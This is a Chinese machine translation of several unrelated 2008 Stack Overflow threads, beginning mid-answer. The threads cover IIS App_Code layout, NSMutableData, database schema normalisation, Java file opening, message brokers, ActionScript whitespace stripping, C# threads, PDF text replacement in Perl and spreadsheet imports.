> 时间：2008-12-24T12:21:50.913

如果嵌套应用程序已将其文件夹转换为应用程序（在 IIS 中右键单击它，属性，然后在“应用程序”选项卡上，“创建”一个新应用程序），您应该将代码放在本地 App_Code 文件夹中：

```
- \RootFolder        // Root of website
|-  \App_Code        // App_Code at root
|-  \NewApplication  // Seperate application in IIS, has "web in a box" icon in IIS
| |-  \App_Code      // App_Code of new application 
```

如果嵌套应用程序不是真正的应用程序（在 IIS 意义上），那么您需要在根 App_Code 文件夹中拥有代码文件。

这也对您的 web.config 有影响 - 如果嵌套应用程序是一个真正的应用程序，那么您将能够在您想要的级别上拥有一个完整的 web.config - 但是如果它不是一个 IIS 应用程序，那么有关于您可以在后续 web.configs 中添加的内容的限制 - 某些元素仅允许在应用程序根目录的 web.config 中，并且不能被其他设置覆盖。

您看到的实际错误是什么？

# iphone - NSMutableData 是如何工作的？

> ID：390725
> 
> 赞同：6
> 
> 时间：2008-12-24T04:18:18.270
> 
> 标签：iphone, cocoa

我有一个问题要处理`NSMutableData`。

我定义了一个`NSMutableData *receivedData`，并试图将几个`NSData*`数据复制到`receivedData`. 我刚打电话`[receivedData appendData:data]`，但似乎没有复制数据：

```
....
NSLog(@"get data! Received %d bytes of data",[data length]);
  // output is not zero, say 1231.

[receivedData appendData:data];
NSLog(@"after append! length is %d bytes of data",[receivedData length]);
  // showing zero 
```

谢谢。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2008-12-24T04:56:19.580

检查是否`receivedData == nil`。如果是这样，那么您可能忘记了初始化它。例如：

```
receivedData = [[NSMutableData alloc] init]; 
```

然后在不再需要时释放它：

```
[receivedData release];
receivedData = nil; 
```

# html - 如何使用超链接发起 Vonage 呼叫

> ID：390727
> 
> 赞同：0
> 
> 时间：2008-12-24T04:19:38.283
> 
> 标签：html

我刚刚完成了一个网页，以便我们的销售人员快速浏览联系人列表。

是否可以通过超链接从我们的 Vonage 线路发起呼叫？

他们提供了一个名为“Click-2-Call”的应用程序，但我希望可以仅使用超链接来启动它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-24T05:02:32.830

这可能需要一个插件来支持允许您的 Vonage 系统以这种方式运行的自定义协议。

我想像

```
Call <a href="phone: 123-456-7890">123-456-7890</a> 
```

其中“电话”协议将被识别为可以由某些默认 voip 程序调用的电话号码。然后，将 Vonage 设置为处理该协议将允许它工作。

但是，我认为目前情况并非如此。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-24T08:00:19.960

是的，这是猜测，但我知道 Skype 有一个浏览器插件，可以查看每个网页并找到电话号码并使其可点击。它可能只是向机器上的 Skype 客户端发送一些信息以进行呼叫。

我以前没见过click-2-call。

这在带有 PBX 系统的应用程序中实现也会很有趣:)

如果您发现一些好的信息，请告诉我们！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-24T18:01:33.957

也许您可以使用像 Ethereal 这样的数据包嗅探器来查看使用 click-2-call 时发送的内容。创建一个 Outlook 扩展来拨打我的 Vonage 线路会非常酷，我不太喜欢 click-2-call。

# database - 数据库架构设计

> ID：390730
> 
> 赞同：3
> 
> 时间：2008-12-24T04:21:45.627
> 
> 标签：database, database-design, schema

我对数据库设计很陌生，对最佳实践有一些疑问，我真的很想学习。我正在设计一个数据库模式，我对需求有一个很好的了解，现在是把它变成黑白的问题。

在这个伪数据库布局中，我有一张客户表、订单表和产品表。

**TBL_PRODUCTS：**
ID
描述
详细信息

**TBL_CUSTOMER：**
ID
名称
地址

**TBL_ORDER：**
ID
TBL_CUSTOMER.ID
prod1
prod2
prod3
等

每个“订单”只有一个客户，但可以有任意数量的“产品”。

问题是，在我的情况下，给定订单的产品可以是任何数量（单个订单数百个），最重要的是，订单的每个产品需要的不仅仅是“数量”，而是可以具有跨越页面的值特定订单的特定产品的文本。我的问题是，我怎样才能存储这些信息？

假设我不能将可变长度数组存储为单个字段值，另一种选择是有一个以某种方式分隔并由应用程序中的代码拆分的字符串。一个订单可能有 100 个产品，每个产品只有一个小的 int，或 5000 个字符或自由文本（或介于两者之间的任何内容），仅对该订单唯一。

最重要的是，每个订单都必须有自己的审计跟踪，因为在它的整个生命周期中可能会发生很多事情。审计跟踪将包含通常的信息——用户、时间/日期、操作，并且可以是任意长度。我是否会将特定订单的审计跟踪存储在创建订单时创建的自己的表中（因为它们可能会变得很长）？

有什么地方可以让我了解更多关于数据库设计技术的信息吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-12-24T04:30:50.863

最常见的方法是将订单项目存储在另一个表中。

```
TBL_ORDER:
ID
TBL_CUSTOMER.ID

TBL_ORDER_ITEM:
ID
TBL_ORDER.ID
TBL_PRODUCTS.ID
Quantity
UniqueDetails 
```

这同样适用于您的订单审计跟踪。它可以是一个新表，例如

```
TBL_ORDER_AUDIT:
ID
TBL_ORDER.ID
AuditDetails 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-24T04:30:52.660

首先，谷歌第三范式。在大多数情况下，您的表应该是 3NF，但在某些情况下，由于性能或易用性原因并非如此，只有经验才能真正教会您这一点。

你所拥有的没有标准化。您需要一个“联接表”来实现多对多关系。

**TBL_ORDER：**
ID
TBL_CUSTOMER.ID

**TBL_ORDER_PRODUCT_JOIN：**
ID
TBL_ORDER.ID
TBL_Product.ID
数量

**TBL_ORDER_AUDIT：**
ID
TBL_ORDER.ID
Audit_Details

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-24T05:30:21.370

**Orders**表中 ID 列的基本常规名称（复数，因为 ORDER 是 SQL 中的关键字）是“Order Number”，确切的拼写不同（OrderNum、OrderNumber、Order_Num、OrderNo、...）。

TBL_ 前缀是多余的；这是双重多余的，因为它并不总是意味着表，例如在 TBL_ORDER 表中使用的 TBL_CUSTOMER.ID 列名中。此外，一般来说，尝试使用“。”是一个坏主意。在列名的中间；您必须始终将该名称视为分隔标识符，将其括在双引号（标准 SQL 和大多数 DBMS）或方括号（MS SQL Server；不确定 Sybase）中。

Joe Celko 对列命名等问题有很多话要说。我不同意他所说的一切，但它很容易搜索。另请参见 Fabian Pascal 的“数据库管理中的实际问题”。

其他答案表明您需要一个“订购商品”表 - 他们是对的；你做。答案还谈到了将数量存储在那里。不要忘记，您需要的不仅仅是数量。例如，您需要订购时的现行价格。在许多系统中，您可能还需要处理折扣、税收和其他详细信息。而如果是复杂的物品（比如飞机），订单上可能只有一个“物品”，但会有大量的从属细节需要记录。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-29T14:20:13.730

虽然不是关于如何设计数据库模式的参考，但我经常使用 DatabaseAnswers.org 上的模式[库](http://www.databaseanswers.org/data_models/index.htm)。如果您想拥有一些已经粗糙的东西，这是一个很好的起点。它们并不完美，很可能需要修改以满足您的需求，但其中有 500 多个。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-29T14:01:13.410

学习用于数据库需求分析的实体关系 (ER) 建模。

学习关系数据库设计和一些关系数据建模，用于表的整体逻辑设计。数据规范化是这篇文章的重要组成部分，但绝不是要学习的全部内容。关系数据库设计在主流 DBMS 产品中几乎是独立于 DBMS 的。

学习物理数据库设计。学习索引设计作为性能设计的第一阶段。一些索引设计是独立于 DBMS 的，但是随着您变得更加详细，物理设计变得越来越依赖于 DBMS 的特殊功能。这可能需要一本专门为您打算使用的 DBMS 量身定制的书。

在设计和构建第一个数据库之前，您不必完成上述所有学习。但你不知道的会伤害你。像任何其他技能一样，你做的越多，你就会越好。学习其他人已经知道的东西比通过反复试验学习要便宜得多。

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2008-12-24T04:47:38.523

看看 Agile Web Development with Rails，它有一个关于 ActiveRecord（Rails 中同名设计模式的实现）的优秀部分，并且很好地解释了这些类型的关系，即使您从未使用过 Rails。[这也是](http://www.railsenvy.com/2007/8/8/activerecord-tutorial)一个很好的在线教程。

# sql - 我们如何从 sql 脚本中调用 ac 函数

> ID：390731
> 
> 赞同：0
> 
> 时间：2008-12-24T04:22:02.053
> 
> 标签：sql, c, plsql

我们如何从 SQL 脚本调用 C 函数？

```
int get_next_fbill_b2kId_seq_num(b2kIdType seq_val,bankIdPtrType bank_id)
{
    validate_dc_alias(dcAlias);
    tbaDateType sysDate;
    tbaGetSystemDateTime(sysDate,NULL,NULL);  /* returns in TBA date format */
    sysDate[10] = EOS;
    get_seq_value(next_num_char, 0, FBILL_B2KID_SRL_NUM,bank_id,TBAFATAL);
    m_sprintf (seq_val, "%s%s%s", dcAlias, sysDate+8,next_num_char);

    return(SUCCESS);
} 
```

这是我在 cxx 文件中定义的函数。我想在 SQL 脚本中调用它。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-24T09:16:16.310

我假设 OP 使用 Oracle，因为他/她写的是 PL/SQL。

可以调用外部 c 过程。[http://www.shutdownabort.com/quickguides/c_extproc.php](http://www.shutdownabort.com/quickguides/c_extproc.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-24T09:04:30.890

如果你的函数是纯 C 语言，你需要创建一个可执行文件并通过[! 或主机](http://www.orafaq.com/wiki/SQL*Plus_FAQ#What_is_the_difference_between_.21_and_HOST.3F)。

如果您处于 .Net 环境中，您还可以创建一个包含您的代码的 .Net 程序集，并像调用PL/SQL 过程一样[调用您的过程。](http://www.oracle.com/technology/pub/articles/mastering_dotnet_oracle/williams_sps.html)

# java - 在 Java 上使用外部应用程序打开文件

> ID：390736
> 
> 赞同：17
> 
> 时间：2008-12-24T04:26:10.127
> 
> 标签：java, external-application

当您不知道文件与哪个应用程序关联时，如何从 java 应用程序打开文件。另外，因为我使用的是 Java，所以我更喜欢独立于平台的解决方案。

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2008-12-24T04:55:09.600

在 JDK1.6 中，[`java.awt.Desktop`](http://java.sun.com/javase/6/docs/api/java/awt/Desktop.html)该类会很有用。

```
public static void open(File document) throws IOException {
    Desktop dt = Desktop.getDesktop();
    dt.open(document);
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-12-24T04:59:58.357

```
File file
Desktop.getDesktop().open( file ); 
```

从 Java 1.6 开始

在此之前你可以[检查这个问题](https://stackoverflow.com/questions/325299)

*概括*

它看起来像这样：

```
Runtime.getRuntime().exec( getCommand( file ) );

public String getCommand( String file ){ 
    // Depending on the platform could be
    //String.format("gnome-open %s", fileName)
    //String.format("open %s", fileName)
    //String.format("cmd /c start %s", fileName)
    // etc. 
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-24T04:34:14.853

您可以在 Windows 上使用 bat 文件和 Unix 上的等效文件一起破解某些东西，但这不会那么有趣。

我认为您最好的选择是[JDesktop 集成组件 (JDIC)](https://jdic.dev.java.net/)。特别是，[Desktop](https://jdic.dev.java.net/nonav/documentation/javadoc/jdic/org/jdesktop/jdic/desktop/Desktop.html)类具有您正在寻找的方法。

编辑：显然，我落后于时代，因为它已被集成到 Java 1.6 中。无论如何，如果您使用的是较早的 Java，它可能仍然有用。

# queue - 消息、队列和 ESB - 我知道我想去哪里，但不知道如何到达那里

> ID：390740
> 
> 赞同：5
> 
> 时间：2008-12-24T04:28:20.433
> 
> 标签：queue, message-queue, messaging, esb

长话短说，我正在开展一个项目，出于所有常见原因，我们正在重写一个大型 Web 应用程序。重写的主要目的是将运行在单个服务器上的大型单个应用程序分成许多较小的解耦应用程序，这些应用程序可以在许多服务器上运行。

好的，这就是我想要的：

我想`HTTP`成为主要的传输机制。当一个应用程序（例如 CMS）已更新时，它将通过 http 联系代理并说*`"I've changed"`*，然后代理将发回一个*`200 OK`*说*`"thanks I got the message"`*。

然后，代理将查看其想要了解 CMS 更改的其他应用程序列表，并将消息传递到应用程序在告诉代理它想听到消息时留下的 url。

其他应用程序将`200 OK`在收到消息时返回，如果没有，代理会保留该消息并将其排队等待下次有人尝试联系该应用程序。

问题是我什至不知道从哪里开始或者我需要什么来实现它。我一直在看`XMPP`、`ActiveMQ`、等`RabbitMQ`，`Mule ESB`并且可以看到我可以在接下来的一年里用这些东西绕圈子。

任何人都可以从个人经验中提供任何建议，因为我很想避免以艰难的方式学习课程。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-28T19:24:43.833

首先，不要担心 ESB。您所描述的情况完全在简单的面向消息的中间件的范围内。如果你正在做诸如中介、基于内容的路由、协议转换之类的事情，你只“需要”一个 ESB；除了将消息路由到正确的位置之外，中间件对消息进行处理的*事情。*

如果你有一组不同的目标应用程序需要相互通信——听起来你确实是这样——你是对的，通过与语言无关的协议（如 XMPP、[STOMP](http://en.wikipedia.org/wiki/Streaming_Text_Orientated_Messaging_Protocol)或 HTTP）进行消息传递是一个很好的解决方案。这基本上意味着您不必编写和运行大量 Java 守护程序即可将消息转换为您最喜欢的 JMS 风格。

STOMP 越来越受到消息代理的支持，尤其是开源代理，并且有许多不同的客户端库。它是一种轻量级协议，专为消息传递而设计，因此您可以获得比 HTTP 更丰富的开箱即用功能。

对我来说，XMPP 有点弱，因为它在服务器端没有得到很好的支持，尽管能够 IM 给你的经纪人很有趣 :)

如果您设置在 HTTP 上，[OpenMQ](https://mq.dev.java.net/about.html)非常好，而且我个人使用过它的[通用消息服务](https://mq.dev.java.net/4.3-content/ums/umsMain.html)- 基本上是一个围绕 JMS 目标的 webapp 包装器。它提供了一个 REST-ful 接口，具有一组与 STOMP 提供的相似的动词。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-12-24T07:23:07.007

自 2003 年左右以来，我一直在各种软件系统中使用 JMS 消息传递。我有一个 Web 应用程序，其中客户端实际上是 JMS 主题订阅者。仅仅通过将消息发布到主题中的行为，消息就会被服务器推送到所有订阅的 Web 客户端。

Web 客户端是基于 Flex 的。我们的中间层堆栈包括：

*   爪哇 6
*   雄猫 6
*   BlazeDS
*   弹簧框架
*   ActiveMQ（JMS 消息代理）

BlazeDS 能够配置为连接 JMS 的桥梁。它是一个 Tomcat servlet，它响应 Flex 客户端远程调用，但也可以在其配置的 JMS 主题中出现新消息时向客户端推送消息。

BlazeDS 实现了 Comet 模式来进行服务器端消息推送：

[异步 HTTP 和 Comet 架构介绍异步、非阻塞 HTTP 编程](http://www.javaworld.com/javaworld/jw-03-2008/jw-03-asynchhttp.html)

Farata Systems 宣布他们已修改 BlazeDS 以使用 Jetty 延续方法来实施彗星模式。这可以针对单个物理服务器扩展到数千个 Comet 连接。

[Farata Systems 借助 Adob​​e BlazeDS 实现性能突破](http://flex.sys-con.com/node/720304/print)

我们正在等待 Adob​​e 自己在 BlazeDS 中实现对 Servlet 3.0 的支持，因为基本上我们非常热衷于组合使用 Tomcat 和 Spring。

实现大规模可扩展 Comet 模式的技术的关键是将 Java NIO HTTP 侦听器与线程池结合使用（例如 Java 5 并发库中的 Executor 类）。Servlet 3.0 是一个异步事件驱动的 servlet 模型，可以与这样的 HTTP 侦听器绑定在一起。然后可以针对单个物理服务器维持数千个（数字如 10,000 到 20,000 个）并发 Comet 连接。

尽管在我们的案例中，我们使用 Adob​​e Flex 技术将 Web 客户端转变为事件驱动的消息订阅者，但对于任何通用 AJAX Web 应用程序都可以这样做。在 AJAX 圈子中，进行服务器端消息推送的技术通常被称为*Reverse AJAX*。您可能已经发现 Comet 是文字游戏，就像 Ajax 的对应物（都是家庭清洁工）。不过，对我们来说，好事是我们只需将我们的部分连接在一起，然后我们就可以走了。通用 AJAX 网络编码器将有更多的编程工作要做。（不过，即使是通用的网络应用程序也可以与 BlazeDS 一起使用 - 它对 BlazeDS 能够执行的 AMF 编组没有任何用处。）

最后，Adobe 和 SpringSource 正在合作建立 BlazeDS 与 Spring-Framework 的更顺畅、开箱即用的集成：

[Adobe 与 SpringSource 合作以增强 Flash 和 SpringSource 平台之间的集成](http://www.springsource.com/node/1077)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2011-08-04T01:34:50.827

正如有人已经说过的，您所描述的基本上是发布者/订阅模型。这很容易使用 ESB 或消息队列来实现。我对 RabbitMQ 有一些经验。这很好。什么都不会丢失，它很好地处理了发布订阅模型。过去，我曾在小型系统上使用基于 http 的定制协议开发自己的消息代理。我不建议这样做，原因是当您开始开发它时，您会一直在思考如何扩展它的方法。

RabbitMQ 是用 Erlang 开发的，但它有 java、net、python 等客户端，可以很容易地连接到它。我用过 .net 和 python 客户端，效果很好。我选择它是因为 Erlang 在创建可以同时处理多件事情的可靠系统方面享有盛誉，非常好。我会称它们为线程，但我认为它比线程更智能，我想我记得 Actor 模型和邮箱的喃喃自语，我记得它们非常整洁。

我的处境与您相似，但在其他消息传递系统（Biztalk 等人）方面的经历非常糟糕，这些系统过于恰当，将您束缚在解决方案中。如果您可以将消息与传输和传递机制分开，那么您可以开发您的系统以满足您的需求。最后我使用了 JSON，因为数据包很小。你可以使用任何你喜欢的东西，有些选择 SOAP 消息，但我觉得这些对于大多数东西来说太重了，尽管它确实允许你很好地将 XSD 模式提供给外部人员，以便他们可以/可以开发与你的互操作的系统未来的系统。

[http://www.rabbitmq.com/tutorials/tutorial-three-java.html](http://www.rabbitmq.com/tutorials/tutorial-three-java.html)，这是发布/订阅模型教程的链接，以及如何使用消息队列系统实现它。它适用于 rabbitMQ，但老实说，它可以与 ESB 和任何其他消息队列系统一起使用。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-07-15T11:27:22.840

ESB（企业串行总线）- 当您的应用程序与两个或多个外部/单独的应用程序有很多交互时考虑这一点，其中每个应用程序都不会以相似的数据格式进行通信。例如：某些系统可能接受对象、XML、JSON、SMTP、TCP/IP、HTTP、HTTPS 等。

ESB 具有许多特性，例如：路由、寻址、消息传递样式、传输协议、服务消息传递模型。

如果生产者 - 消费者应用程序遵循相同类型的数据格式，请考虑队列系统。

如果一个应用程序需要另一个应用程序来完成工作流程，Web 服务（SOAP / REST）是最好的。如果应用程序需要异步数据传输，请使用队列。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2011-04-14T19:49:13.980

您实际上是在谈论确保交付的发布和订阅。大多数 MOM 软件应该很容易支持您的用例。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-07-15T20:08:33.133

正如前面已经说过的那样，在我看来，为您当前的情况使用 ESB 就像用锤子砸苍蝇一样。

ESB 软件本身会很耗时并且需要维护。如果您使用开源解决方案，它可能比使用许可解决方案（IBM、ORACLE 等）更耗时。

当然，ESB 可以完成这项工作，而且开发解决方案非常容易，但设置 ESB 比开发解决方案本身要困难得多。

如果您的问题仅限于所描述的情况，我强烈建议您在 OpenMQ（或类似的）上构建一个简单的架构，并通过 JMS 使用它

# actionscript - 删除 ActionScript 2 变量中的空格

> ID：390748
> 
> 赞同：2
> 
> 时间：2008-12-24T04:32:48.037
> 
> 标签：actionscript, string, variables

假设我有一个包含以下内容的 XML 文件：

```
<description><![CDATA[

   <h2>lorem ipsum</h2>
   <p>some text</p>

]]></description> 
```

我想在 ActionScript 2 中获取并解析为 HTML 文本，并在显示之前设置一些 CSS。问题是，Flash 采用这些空格（换行符和制表符）并按原样显示。

```
<some whitespace here>
       lorem ipsum
       some text 
```

我想要的输出在哪里

```
lorem ipsum
some text 
```

我知道我可以直接从 XML 文件中删除空格（我工作场所的 Flash 开发人员也建议这样做。我猜他不知道如何做到这一点[叹气]）。但是这样做，很难阅读 XML 文件中的部分，尤其是当涉及到大量标签时，这会使编辑更加困难。

所以现在，我正在寻找一种在 ActionScript 中去除这些空格的方法。我试过使用 PHP 的`str_replace`等价物（从[这里](http://snipplr.com/view/3369/strreplace/)得到）。但是我应该用什么作为针（要搜索的字符串）？（我试图输入`"\t"`and `"\r"`，似乎无法检测到那些空格）。

编辑 ：

现在我已经尝试`newline`像针一样投入，它可以工作（意味着换行成功被剥离）。

```
mystring = str_replace(newline, '', mystring); 
```

但是，换行符只被剥离一次，这意味着在每个连续的换行符中（例如，一个换行符后跟另一个换行符）只能剥离一个换行符。

现在，我不认为这是`str_replace`函数中的问题，因为除了换行符之外的每个连续字符都被剥离得很好。

对 ActionScript 中如何处理此类事情感到非常困惑。:-s

编辑2：

我已经尝试了 str_replace -ing 我所知道的所有内容，\n、\r、\t、换行符和制表符（通过按制表键）。替换 \n、\r 和 \t 似乎没有任何效果。

我知道通过成功地做到这一点，我的内容永远不会有真正的换行符。这正是我的意图。我可以按照我想要的方式格式化 XML，而无需 Flash 显示任何格式化内容。:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-26T02:02:35.517

有几种方法可以解决这个问题。也许最简单的答案是，从某种意义上说，您的 Flash 开发人员可能是对的，您应该将空格移到 CDATA 容器之外。原因是，许多人（至少我）倾向于假设 CDATA 中的所有内容都是“真实数据”，而不是标记。另一方面，通常假定 CDATA*之外*的空白是不相关的，因此数据如下：

```
<description>

<![CDATA[<h2>lorem ipsum</h2>
<p>some text</p>]]>

</description> 
```

会更容易理解和使用。（闪存开发人员可以使用该`XML.ignoreWhite`属性忽略 CDATA 之外的空白。）

话虽如此，如果您手动编辑 XML，那么我可以理解为什么使用您描述的格式会更容易。但是，如果额外的空格在 CDATA 内部，那么它将不可避免地包含在您提取的字符串数据中，因此您唯一的选择是获取 CDATA 的内容并在之后删除空格。

然后你的问题减少到“如何从 AS2 中的字符串中去除前导/尾随空格？”。不幸的是，由于 AS2 不支持 RegEx，因此没有简单的方法可以做到这一点。我认为您最好的选择是从头到尾解析以找到第一个/最后一个非白色字符。这些方面的东西（未经测试的伪代码）：

```
myString = stuffFromXML;
whitespace = " " + "\t" + "\n" + "\r" + newline;
start = 0;
end = myString.length;
while ( testString( myString.substr(start,1), whitespace ) ) { start++; }
while ( testString( myString.substr(end-1,1), whitespace ) ) { end--; }
trimmedString = myString.substring( start, end );

function testString( needle, haystack ) {
    return ( haystack.indexOf( needle ) > -1 );
} 
```

希望有帮助！

编辑：我注意到在您的示例中，您还需要删除文本数据中的制表符和*空格*。这会很棘手，除非您可以保证您的数据永远不会包含“真实”选项卡以及用于格式化的选项卡。无论您如何处理 CDATA 标记，最好不要在真实内容中插入无关格式，然后再以编程方式将其删除。那只会让你自己的生活变得困难。

第二次编辑：至于要删除什么字符以摆脱换行符，这部分取决于 XML 中实际以哪些字符开头（这可能取决于生成文件的操作系统正在运行），部分取决于什么字符客户端机器（显示闪存）考虑换行符。[这里](http://en.wikipedia.org/wiki/Newline)有很多血腥的细节。但在实践中，如果您删除`\r`、`\n`和`\r\n`，则通常可以解决问题。这就是我在示例代码中将 \r 和 \n 添加到“空白”字符串的原因。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-24T22:54:29.890

自从我修补 AS2 以来已经有一段时间了。

```
someXML = new XML();
someXML.ignoreWhite = true; 
```

如果你想**str_replace**试试**'\n'**

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-05T06:11:38.693

您使用 cdata 是否有原因？诚然，我不知道这种情况的最佳实践是什么，但我倾向于将它们排除在外，只将 HTML 放在节点内。 `var foo = node.childnodes.join("")`解析出来就好了，我似乎从来没有遇到过这些空白问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-10T23:29:14.177

我一遍又一遍地阅读这篇文章，如果我的解释是正确的，那么您只想知道如何从 AS2 中的字符串中删除某些字符（制表符和换行符），对吧？我不敢相信还没有人给你一个简单的单行答案：

```
myString = myString.split("\n").join("");
```

而已。对 \r、\n 和 \t 重复此操作，所有换行符和制表符都将消失。如果您希望它是一个简单的功能，请执行以下操作：

```
function stripWhiteSpace(str: String) : String
{
    return str.split("\r").join("").split("\n").join("").split("\t").join("");
}
```

该函数不会修改您的旧字符串，它会返回一个没有 \r、\n 或 \t 的新字符串。要实际修改旧字符串，请使用该函数，如下所示：

```
myString = stripWhiteSpace(myString);
```

# c# - 是否应该始终保留对 C# 中正在运行的 Thread 对象的引用？

> ID：390753
> 
> 赞同：12
> 
> 时间：2008-12-24T04:34:33.120
> 
> 标签：c#, multithreading, reference

或者可以这样做：

```
new Thread( new ThreadStart( delegate { DoSomething(); } ) ).Start(); 
```

?

我似乎记得在这种情况下，线程对象将被垃圾收集，但底层操作系统线程将继续运行，直到传递给它的委托结束。我基本上是在寻找 ThreadPool 功能，但不希望线程成为后台线程（即我希望它们使应用程序保持活动状态）。

**更新：**
根据 Jason 的说法，CLR 在运行时实际上保留了对 Thread 对象的内部引用，因此在线程退出之前不会对其进行垃圾收集。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-12-24T05:00:42.287

我通常发现，如果我需要像您在示例中那样直接启动一个新线程，而不是从线程池中获取一个，那么它是一个长时间运行的线程，我稍后需要引用它来杀死它，监视它等。对于像在后台线程上调用 IO 等短期运行线程，我总是使用线程池线程（通常通过 someDelete.BeginBlah(...) 方法调用间接地）。当使用这样的线程池线程时，我更喜欢不保留参考。我不知道其他程序员是否会不恰当地使用对该线程的引用。如果我不需要参考，我不会保留它以使代码混乱。

**编辑：** 要回答您关于线程被垃圾收集的编辑，线程运行时不会发生这种情况。CLR 保留对每个正在运行的线程的引用。不会收集表示线程的对象。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-24T04:45:49.853

这取决于。在用户可以取消线程操作的情况下，您应该保留引用，以便在用户需要时取消线程。在其他情况下，可能不需要存储引用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-24T06:09:09.387

我在生产代码中遇到过许多适合这样做的案例。所以，是的，在一行中定义和启动一个线程而不保留引用就可以了。我认为保留参考“以防万一”您以后重新设计并需要它，这违反了创建最简单有效的东西的原则。

而且，对于第二部分，不，它在运行时不会被 GC 处理；线程是 Gtor 将从中追踪引用的根级对象。Thread 实例只有在任何正在运行的线程（包括您在其上启动的线程）都无法访问时才会被 GCd。

并注意泄漏创建但从未启动的 Thread 实例。我相信他们会永远闲逛。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-24T04:55:09.333

最好问“这个线程多久启动一次？”这个问题。它是按应用程序、按类、按对象实例还是按方法调用？这可能会告诉您将其存储在哪种变量（如果有）中。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-24T05:01:49.103

是的，您应该这样做，因为您永远不知道以后何时必须更改代码才能以某种方式处理线程。那样，在一行上放太多东西真是丑陋。

所以说实话，你可以按照自己的方式去做，所以答案真的归结为代码风格偏好。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-24T05:38:25.690

除了上面发布的“m3rLinEz”之外，另一个缺点是如果您的线程中发生任何异常，甚至很难检测到这种情况。

# perl - 如何使用 Perl 在 PDF 文档中搜索和替换？

> ID：390773
> 
> 赞同：4
> 
> 时间：2008-12-24T04:51:03.913
> 
> 标签：perl, search, pdf, replace

有谁知道免费的 Perl 程序（最好是命令行）、模块或任何方式来搜索和替换 PDF 文件中的文本，而不像编辑器那样使用它。

基本上，我想编写一个程序（最好用 Perl）来自动替换几百个 PDF 文件中的某些单词（例如我们的旧地址）。我可以使用任何支持命令行参数的程序。我知道 CPAN 上有许多模块可以操作或创建 pdf，但它们没有（我见过的）任何简单的搜索和替换。

在此先感谢您的任何建议！！！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-25T14:08:03.397

看看[CAM::PDF](http://search.cpan.org/~cdolan/CAM-PDF-1.52/lib/CAM/PDF.pm)。更具体地说是 changeString 方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-24T08:59:27.220

您最初是如何生成这些 PDF 的？在原始来源中搜索和替换并重新生成 PDF 似乎更可行。直接编辑 PDF 可能非常困难，而且我不知道有任何免费工具可以轻松做到这一点。

# database - 您通常如何将数据从电子表格导入到多个数据库列？

> ID：390784
> 
> 赞同：6
> 
> 时间：2008-12-24T04:58:08.203
> 
> 标签：database, excel, scripting, utilities

无论出于何种原因，我有很多客户拥有存储在电子表格中的现有数据。每个电子表格中通常有数百甚至数千个项目，并且要求客户通过网站手动输入它们（或者天堂禁止我自己以这种方式导入它们）是不可能的。通常，此数据不会简单地将电子表格列映射到数据库列。那太简单了。通常，数据需要在进入数据库之前进行操作（数据需要用逗号分隔等），或者数据需要分布在多个表中。或两者。

我问这个问题，不是因为我不知道有多种方法可以做到这一点，而是因为我还没有找到一种不会觉得需要做更多工作的方法。到目前为止，我已经采用了以下所有方法（可能还有更多我已经忘记的方法）：

*   使用Excel修改数据，所以导入更容易一些
*   将整个电子表格导入到临时表中，然后使用 SQL 导入
*   编写脚本并使用它导入数据（我使用过 VBScript、C# 和现在的 Ruby）

到目前为止，使用脚本似乎是最灵活的方式，但仍然感觉有点笨拙。我必须完成这项任务，以至于我什至考虑为它编写一个小 DSL，只是为了加快速度。

但在我这样做之前，我很好奇，有没有更好的方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-24T05:05:07.020

是的..那只是糟透了。

我会选择剧本。而且我假设您有重复的列必须匹配另一个表中的单行。我会进行合理的匹配，如果您遇到脚本无法处理的行并移动数据......然后记录它并让某人手动执行。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-24T05:06:08.843

当然，这些小细节会让你丧命，但总的来说，我已经成功地将数据从 Excel 导出为 CSV，然后使用 rool 或脚本读取它，根据需要对其进行修改，然后插入它. 根据我的环境的美妙程度，这可以通过脚本语言的数据库接口来完成，包括将 SQL INSERT 语句写入脚本文件。

[Python](http://docs.python.org/library/csv.html)、[Ruby](http://www.ruby-doc.org/stdlib/libdoc/csv/rdoc/index.html)和[Perl](http://search.cpan.org/dist/Snail-CSV/lib/Snail/CSV.pm)都有很好的 CSV 包。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-24T05:57:35.637

如果可以的话，你必须设定界限。您应该尝试提供一个模板供他们使用预期数据，其中包括文件类型（Excel、csv 等）、列名、有效值等。您应该允许用户浏览文件并上传在您的页面/表格上。

